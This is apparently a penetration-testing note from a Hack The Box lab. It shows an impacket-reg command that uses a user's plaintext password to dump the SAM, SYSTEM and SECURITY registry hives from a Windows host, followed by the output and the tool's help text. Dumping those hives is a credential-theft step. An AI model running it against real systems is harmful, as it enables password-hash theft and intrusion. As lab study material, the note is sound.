
`impacket-reg 'cicada.htb/emily.oscars':'Q!3@Lp#M6b*7t*Vt'@10.129.169.79 backup -o 'c:\users\emily.oscars.cicada\desktop\'` (or a connected share \_letter\_)

### Examples

```sh
┌──(fixit42㉿kali)-[~/tools]
└─$ impacket-reg 'cicada.htb/emily.oscars':'Q!3@Lp#M6b*7t*Vt'@10.129.169.79 backup -o 'c:\users\emily.oscars.cicada\desktop\'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to c:\users\emily.oscars.cicada\desktop\\SAM.save
[*] Saved HKLM\SYSTEM to c:\users\emily.oscars.cicada\desktop\\SYSTEM.save
[*] Saved HKLM\SECURITY to c:\users\emily.oscars.cicada\desktop\\SECURITY.save
```

### Help

```sh
┌──(fixit42㉿kali)-[~/tools]
└─$ impacket-reg -h                                                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

usage: reg.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
              [-target-ip ip address] [-port [destination port]]
              target {query,add,delete,save,backup} ...

Windows Register manipulation script.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  {query,add,delete,save,backup}
                        actions
    query               Returns a list of the next tier of subkeys and entries that are located under a specified subkey in
                        the registry.
    add                 Adds a new subkey or entry to the registry
    delete              Deletes a subkey or entries from the registry
    save                Saves a copy of specified subkeys, entries, and values of the registry in a specified file.
    backup              (special command) Backs up HKLM\SAM, HKLM\SYSTEM and HKLM\SECURITY to a specified file.

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don´t ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target
                        parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is
                        useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
```

